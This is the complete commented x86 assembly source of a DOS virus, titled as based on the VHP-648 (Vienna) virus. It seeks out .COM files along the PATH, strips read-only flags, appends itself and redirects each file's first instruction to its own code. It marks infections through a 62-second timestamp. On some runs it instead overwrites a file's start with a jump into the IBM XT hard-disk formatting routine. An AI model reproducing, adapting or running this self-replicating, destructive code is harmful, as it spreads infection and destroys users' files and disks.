      name       Virus
      title      Virus; based on the famous VHP-648 virus
     .radix      16
      code       segment
      assume     cs:code,ds:code
      org        100
environ equ      2C

start:
      jmp      virus
      int      20

data label byte                 ;Data section
dtaaddr    dd      ?            ;Disk Transfer Address
ftime      dw      ?            ;File date
fdate      dw      ?            ;File time
fattrib    dw      ?            ;File attribute
saveins    db      3 dup (90)   ;Original first 3 bytes
newjmp     db      0E9          ;Code of jmp instruction
codeptr    dw      ?            ;Here is formed a jump to virus code
allcom     db      '*.COM',0    ;Filespec to search for
poffs      dw      ?            ;Address of 'PATH' string
eqoffs     dw      ?            ;Address of '=' sign
pathstr    db      'PATH='
fname      db      40 dup (' ') ;Path name to search for

;Disk Transfer Address for Find First / Find Next:

mydta label byte
drive      db      ?            ;Drive to search for
pattern    db      13d dup (?)  ;Search pattern
reserve    db      7 dup (?)    ;Not used
attrib     db      ?            ;File attribute
time       dw      ?            ;File time
date       dw      ?            ;File date
fsize      dd      ?            ;File size
namez      db      13d dup (?)  ;File name found

;This replaces the first instruction of a destroyed file.
;It's a jmp instruction into the hard disk formatting program (IBM XT only):

bad_jmp    db      0EA,0,0,0,0C8
errhnd     dd      ?

virus:
      push      cx               ;Save CX
      mov       dx,offset data   ;Restore original first instruction
modify      equ      $-2         ;The instruction above is changed
                                 ;before each contamination
      cld
      mov      si,dx
      add      si,saveins-data   ;Instruction saved there
      mov      di,offset start
      mov      cx,3              ;Move 3 bytes
      rep      movsb             ;Do it
      mov      si,dx             ;Keep SI pointed at data

      mov      ah,30             ;Get DOS version
      int      21
      cmp      al,0              ;Less than 2.0?
      jne      skip1
      jmp      exit              ;Exit if so

skip1:
      push     es                ;Save ES
      mov      ah,2F             ;Get current DTA in ES:BX
      int      21
      mov      [si+dtaaddr-data],bx   ;Save it in dtaaddr
      mov      [si+dtaaddr+2-data],es

      mov      ax,3524           ;Get interrupt 24h handler
      int      21                ; and save it in errhnd
      mov      [si+errhnd-data],bx
      mov      [si+errhnd+2-data],es
      pop      es                ;Restore ES

      mov      ax,2524           ;Set interrupt 24h handler
      mov      dx,si
      add      dx,handler-data
      int      21

      mov      dx,mydta-data
      add      dx,si
      mov      ah,1A             ;Set DTA
      int      21

      push     es                ;Save ES & SI
      push     si
      mov      es,ds:[environ]   ;Environment address
      xor      di,di
n_00015A:                        ;Search 'PATH' in environment
      pop      si                ;Restore data offset in SI
      push     si
      add      si,pathstr-data
      lodsb
      mov      cx,8000           ;Maximum 32K in environment
      repne    scasb             ;Search for first letter ('P')
      mov      cx,4              ;4 letters in 'PATH'
n_000169:
      lodsb                      ;Search for next char
      scasb
      jne      n_00015A          ;If not found, search for next 'P'
      loop     n_000169          ;Loop until done
      pop      si                ;Restore SI & ES
      pop      es

      mov      [si+poffs-data],di  ;Save 'PATH' offset in poffs
      mov      bx,si               ;Point BX at data area
      add      si,fname-data       ;Point SI & DI at fname
      mov      di,si
      jmp      short n_0001BF

n_000185:
      cmp      word ptr [si+poffs-data],6C
      jne      n_00018F
      jmp      olddta
n_00018F:
      push     ds
      push     si
      mov      ds,es:[environ]
      mov      di,si
      mov      si,es:[di+poffs-data]
      add      di,fname-data
n_0001A1:
      lodsb
      cmp      al,';'
      je       n_0001B0
      cmp      al,0
      je       n_0001AD
      stosb
      jmp      n_0001A1
n_0001AD:
      xor      si,si
n_0001B0:
      pop      bx
      pop      ds
      mov      [bx+poffs-data],si
      cmp      byte ptr [di-1],'\'
      je       n_0001BF
      mov      al,'\'            ;Add '\' if not already present
      stosb

n_0001BF:
      mov      [bx+eqoffs-data],di  ;Save '=' offset in eqoffs
      mov      si,bx                ;Restore data pointer in SI
      add      si,allcom-data
      mov      cl,6                 ;6 bytes in ASCIIZ '*.COM'
      rep      movsb                ;Move '*.COM' at fname
      mov      si,bx                ;Restore SI

      mov      ah,4E            ;Find first file
      mov      dx,fname-data
      add      dx,si
      mov      cl,11b            ;Hidden, Read/Only or Normal files
      int      21
      jmp      short n_0001E3

findnext:
      mov      ah,4F             ;Find next file
      int      21
n_0001E3:
      jnc      n_0001E7          ;If found, try to contaminate it
      jmp      n_000185          ;Otherwise search in another directory

n_0001E7:
      mov      ax,[si+time-data] ;Check file time
      and      al,11111b         ; (the seconds, more exactly)
      cmp      al,62d/2          ;Are they 62?

;If so, file is already contains the virus, search for another:

      je       findnext

;Is file size greather than 64,000 bytes?

      cmp      [si+fsize-data],64000d
      ja       findnext          ;If so, search for next file

;Is file size less than 10 bytes?

      cmp      word ptr [si+fsize-data],10d
      jb       findnext          ;If so, search for next file

      mov      di,[si+eqoffs-data]
      push     si                ;Save SI
      add      si,namez-data     ;Point SI at namez
n_000209:
      lodsb
      stosb
      cmp      al,0
      jne      n_000209

      pop      si                ;Restore SI
      mov      ax,4300           ;Get file attributes
      mov      dx,fname-data
      add      dx,si
      int      21

      mov      [si+fattrib-data],cx  ;Save them in fattrib
      mov      ax,4301               ;Set file attributes
      and      cl,not 1              ;Turn off Read Only flag
      int      21

      mov      ax,3D02               ;Open file with Read/Write access
      int      21
      jnc      n_00023E
      jmp      oldattr               ;Exit on error

n_00023E:
      mov      bx,ax                 ;Save file handle in BX
      mov      ax,5700               ;Get file date & time
      int      21
      mov      [si+ftime-data],cx    ;Save time in ftime
      mov      [si+fdate-data],dx    ;Save date in fdate

      mov      ah,2C                 ;Get system time
      int      21
      and      dh,111b               ;Are seconds a multiple of 8?
      jnz      n_000266              ;If not, contaminate file (don't destroy):

;Destroy file by rewriting an illegal jmp as first instruction:

      mov      ah,40                 ;Write to file handle
      mov      cx,5                  ;Write 5 bytes
      mov      dx,si
      add      dx,bad_jmp-data       ;Write THESE bytes
      int      21                    ;Do it
      jmp      short oldtime         ;Exit

;Try to contaminate file:

;Read first instruction of the file (first 3 bytes) and save it in saveins:

n_000266:
      mov      ah,3F                 ;Read from file handle
      mov      cx,3                  ;Read 3 bytes
      mov      dx,saveins-data       ;Put them there
      add      dx,si
      int      21
      jc       oldtime               ;Exit on error
      cmp      ax,3                  ;Are really 3 bytes read?
      jne      oldtime               ;Exit if not

;Move file pointer to end of file:

      mov      ax,4202               ;LSEEK from end of file
      xor      cx,cx                 ;0 bytes from end
      xor      dx,dx
      int      21
      jc       oldtime               ;Exit on error

      mov      cx,ax                 ;Get the value of file pointer (file size)
      add      ax,virus-data-3       ;Add virus data length to get code offset
      mov      [si+codeptr-data],ax  ;Save result in codeptr
      inc      ch                    ;Add 100h to CX
      mov      di,si
      add      di,modify-data        ;A little self-modification
      mov      [di],cx
                              
      mov      ah,40                 ;Write to file handle
      mov      cx,endcode-data       ;Virus code length as bytes to be written
      mov      dx,si                 ;Write from data to endcode
      int      21
      jc       oldtime               ;Exit on error
      cmp      ax,endcode-data       ;Are all bytes written?
      jne      oldtime               ;Exit if not
                            
      mov      ax,4200               ;LSEEK from the beginning of the file
      xor      cx,cx                 ;Just at the file beginning
      xor      dx,dx
      int      21
      jc       oldtime               ;Exit on error

;Rewrite the first instruction of the file with a jump to the virus code:

      mov      ah,40                 ;Write to file handle
      mov      cl,3                  ;3 bytes to write
      mov      dx,si
      add      dx,newjmp-data        ;Write THESE bytes
      int      21

oldtime:
      mov      dx,[si+fdate-data]    ;Restore file date
      mov      cx,[si+ftime-data]    ; and time
      and      cl,not 11111b
      or       cl,11111b             ;Set seconds to 62 (?!)

      mov      ax,5701               ;Set file date & time
      int      21
      mov      ah,3E                 ;Close file handle
      int      21

oldattr:
      mov      ax,4301               ;Set file attributes
      mov      cx,[si+fattrib-data]  ;They were saved in fattrib
      mov      dx,fname-data
      add      dx,si
      int      21

olddta:
      push     ds                    ;Save DS
      mov      ah,1A                 ;Set DTA
      mov      dx,[si+dtaaddr-data]  ;Restore saved DTA
      mov      ds,[si+dtaaddr+2-data]
      int      21

      mov      ax,2524               ;Set interrupt 24h handler
      mov      dx,[si+errhnd-data]   ;Restore saved handler
      mov      ds,[si+errhnd+2-data]
      int      21
      pop      ds                    ;Restore DS

exit:
      pop      cx                    ;Restore CX
      xor      ax,ax                 ;Clear registers
      xor      bx,bx
      xor      dx,dx
      xor      si,si
      mov      di,100                ;Jump to CS:100
      push     di                    ; by doing funny RET
      xor      di,di
      ret      -1

handler:                             ;Critical error handler
      mov      al,0                  ;Just ignore error
      iret                           ; and return

endcode label  byte
   code        ends
               end      start
